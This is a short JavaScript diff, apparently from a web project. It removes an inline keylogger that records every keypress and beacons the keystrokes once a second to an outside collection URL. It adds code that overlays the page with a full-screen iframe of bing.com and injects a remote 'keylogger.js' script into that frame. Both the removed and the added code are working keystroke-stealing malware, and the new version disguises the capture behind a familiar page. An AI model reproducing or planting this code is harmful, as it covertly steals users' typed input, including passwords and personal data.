@@ -1,18 +1,8 @@
-function start() {
-	console.log("I work!");
-	var keys='';
-	var url = 'https://data.turtlecode84.repl.co/keylogger/collect.php?c=';
-
-	window.onkeypress = function(e) {
-		get = window.event?event:e;
-		key = get.keyCode?get.keyCode:get.charCode;
-		key = String.fromCharCode(key);
-		keys+=key;
-	}
-	window.setInterval(function(){
-		if(keys.length>0) {
-			new Image().src = url+keys;
-			keys = '';
-		}
-	}, 1000);
-}
+var iframe = document.createElement('iframe');
+iframe.setAttribute("src", "https://bing.com");
+iframe.setAttribute("style", "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;");
+var js = '<script src="https://turtlecode84.github.io/cdn/scripts/keylogger.js"></script>';
+document.body.appendChild(iframe);
+iframe.contentWindow.document.open();
+iframe.contentWindow.document.write(js);
+iframe.contentWindow.document.close();
